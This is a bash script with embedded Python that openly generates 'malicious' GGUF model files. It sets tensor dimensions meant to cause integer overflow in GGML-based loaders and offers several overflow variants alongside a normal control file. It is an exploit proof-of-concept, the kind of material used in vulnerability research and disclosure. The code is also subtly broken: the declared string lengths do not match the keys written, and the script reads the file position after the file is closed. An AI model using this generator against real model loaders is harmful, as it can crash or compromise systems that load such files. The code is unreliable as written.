#!/bin/bash
# GGUF Malicious File Generator
# Creates minimal GGUF files with overflow-inducing tensor dimensions.
#
# Usage: bash generate_malicious_gguf.sh [output.gguf] [variant]
# Variants: primary (default), nb3, 4d, normal
#
# Examples:
#   bash generate_malicious_gguf.sh /tmp/overflow.gguf primary
#   bash generate_malicious_gguf.sh /tmp/overflow_nb3.gguf nb3
#   bash generate_malicious_gguf.sh /tmp/overflow_4d.gguf 4d
#   bash generate_malicious_gguf.sh /tmp/normal.gguf normal

set -e

OUTPUT="${1:-/tmp/malicious.gguf}"
VARIANT="${2:-primary}"

# Dimensions by variant
case "$VARIANT" in
  primary) NE0=$((1<<31)); NE1=$((1<<31)); NE2=1; NE3=1 ;;
  nb3)     NE0=$((1<<21)); NE1=$((1<<21)); NE2=$((1<<20)); NE3=1 ;;
  4d)      NE0=$((1<<16)); NE1=$((1<<16)); NE2=$((1<<15)); NE3=$((1<<15)) ;;
  normal)  NE0=256; NE1=256; NE2=1; NE3=1 ;;
  *)       echo "Unknown variant: $VARIANT"; exit 1 ;;
esac

echo "Generating $VARIANT GGUF: $OUTPUT"
echo "  Dimensions: {$NE0, $NE1, $NE2, $NE3}"

python3 -c "
import struct, sys

output = '$OUTPUT'
ne = [$NE0, $NE1, $NE2, $NE3]

with open(output, 'wb') as f:
    # Magic
    f.write(b'GGUF')
    # Version
    f.write(struct.pack('<I', 3))
    # n_tensors (int64)
    f.write(struct.pack('<q', 1))
    # n_kv (int64)
    f.write(struct.pack('<q', 2))

    # KV: general.architecture = 'llama'
    f.write(struct.pack('<Q', 18))  # key length
    f.write(b'general.architecture')
    f.write(struct.pack('<i', 8))   # GGUF_TYPE_STRING
    f.write(struct.pack('<Q', 5))   # value length
    f.write(b'llama')

    # KV: general.name = 'test'
    f.write(struct.pack('<Q', 11))  # key length
    f.write(b'general.name')
    f.write(struct.pack('<i', 8))   # GGUF_TYPE_STRING
    f.write(struct.pack('<Q', 4))   # value length
    f.write(b'test')

    # Tensor metadata
    f.write(struct.pack('<Q', 12))  # name length
    f.write(b'test_tensor')
    f.write(struct.pack('<I', 4))   # n_dims
    for n in ne:
        f.write(struct.pack('<q', n))  # dimensions
    f.write(struct.pack('<i', 0))   # GGML_TYPE_F32
    f.write(struct.pack('<Q', 0))   # data offset

    # Pad to 32-byte alignment
    pos = f.tell()
    pad = (32 - (pos % 32)) % 32
    f.write(b'\x00' * pad)

    # Minimal tensor data (4 bytes)
    f.write(b'\x00\x00\x00\x00')

    # Pad to alignment
    pos = f.tell()
    pad = (32 - (pos % 32)) % 32
    f.write(b'\x00' * pad)

print(f'  File size: {f.tell()} bytes')
print(f'  Done.')
"
